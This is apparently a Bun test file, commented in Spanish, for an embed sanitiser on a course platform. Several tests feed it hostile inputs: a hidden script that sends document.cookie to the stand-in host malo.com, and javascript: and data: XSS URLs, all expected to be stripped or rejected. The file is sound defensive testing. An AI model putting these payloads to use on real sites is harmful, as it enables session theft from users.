import { expect, test } from "bun:test";
import { urlDeEmbed, altoSugerido, pistaDeEmbed } from "../../src/lib/embed";

/**
 * Lo que decide si insertar contenido es seguro.
 *
 * De un codigo pegado se saca la direccion y se tira TODO lo demas. Sin eso,
 * un bloque copiado de cualquier sitio puede traer un `<script>` detras, y ese
 * script correria en el navegador de los alumnos con su sesion abierta.
 */

test("de un iframe pegado saca solo la direccion", () => {
  const pegado =
    '<iframe src="https://calendly.com/joffre/30min" width="100%" height="700" frameborder="0"></iframe>';
  expect(urlDeEmbed(pegado)).toBe("https://calendly.com/joffre/30min");
});

test("un script escondido junto al iframe NO sobrevive", () => {
  // Este es el ataque: se copia un bloque que trae mas de lo que aparenta.
  const pegado =
    '<iframe src="https://typeform.com/to/abc"></iframe><script>fetch("https://malo.com?c="+document.cookie)</script>';
  const url = urlDeEmbed(pegado);
  expect(url).toBe("https://typeform.com/to/abc");
  expect(url).not.toContain("script");
  expect(url).not.toContain("cookie");
});

test("acepta tambien un enlace pelado", () => {
  expect(urlDeEmbed("https://docs.google.com/forms/d/e/xyz/viewform")).toBe(
    "https://docs.google.com/forms/d/e/xyz/viewform?embedded=true"
  );
});

test("javascript: se rechaza", () => {
  // Un enlace asi ejecuta codigo en cuanto se carga el marco.
  expect(urlDeEmbed("javascript:alert(document.cookie)")).toBeNull();
  expect(urlDeEmbed('<iframe src="javascript:alert(1)"></iframe>')).toBeNull();
});

test("data: tambien", () => {
  expect(urlDeEmbed('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>')).toBeNull();
});

test("texto que no es un enlace devuelve null", () => {
  expect(urlDeEmbed("pega aqui tu formulario")).toBeNull();
  expect(urlDeEmbed("")).toBeNull();
  expect(urlDeEmbed("   ")).toBeNull();
});

test("convierte los enlaces que no se pueden insertar tal cual", () => {
  // Estos tres son los que la gente copia de la barra del navegador y que,
  // pegados sin convertir, muestran un marco en blanco.
  expect(urlDeEmbed("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).toBe(
    "https://www.youtube.com/embed/dQw4w9WgXcQ"
  );
  expect(urlDeEmbed("https://youtu.be/dQw4w9WgXcQ")).toBe(
    "https://www.youtube.com/embed/dQw4w9WgXcQ"
  );
  expect(urlDeEmbed("https://www.loom.com/share/abc123")).toBe(
    "https://www.loom.com/embed/abc123"
  );
});

test("el alto se ajusta al servicio", () => {
  // Un calendario necesita mas alto que un video: con uno fijo, Calendly sale
  // con barra de desplazamiento interna y es incomodo de usar.
  expect(altoSugerido("https://calendly.com/x")).toBeGreaterThan(
    altoSugerido("https://www.youtube.com/embed/x")
  );
});

test("el fragmento de Typeform NO se convierte: no se puede", () => {
  // Esta prueba afirmaba lo contrario y estaba MAL. Se dio por hecho que el
  // identificador de `data-tf-live` valdria como `form.typeform.com/to/{id}`;
  // Typeform responde a eso con una redireccion a su propia web marcada como
  // `typeform-incorrectURL`, asi que la clase acababa enseñando el anuncio de
  // Typeform en lugar del formulario. Y en silencio: el editor decia
  // "Contenido insertado".
  //
  // Ese identificador solo lo resuelve el script de Typeform, y aqui no se
  // ejecuta ningun script de fuera. Lo unico correcto es no aceptarlo.
  const pegado =
    '<div data-tf-live="01JKRAVFBPREFJQT1NAPWT8BSB"></div>' +
    '<script src="//embed.typeform.com/next/embed.js"></script>';

  expect(urlDeEmbed(pegado)).toBeNull();
});

test("y se explica donde esta el enlace bueno", () => {
  // "No parece un enlace valido" deja a alguien pegando lo mismo una y otra
  // vez. La pista dice el sitio exacto: la pestaña de compartir de Typeform.
  const pista = pistaDeEmbed('<div data-tf-live="01JKRAV"></div>') ?? "";
  expect(pista).toContain("Share");
  expect(pista).toContain("form.typeform.com/to/");
});

test("un script cualquiera tambien explica por que no", () => {
  const pista = pistaDeEmbed('<script src="https://otro.com/w.js"></script>') ?? "";
  expect(pista).toContain("scripts");
});

test("el enlace normal de Typeform si vale", () => {
  // El de la pestaña de compartir: codigo corto, y se inserta tal cual.
  expect(urlDeEmbed("https://form.typeform.com/to/AbC12dEf")).toBe(
    "https://form.typeform.com/to/AbC12dEf"
  );
});
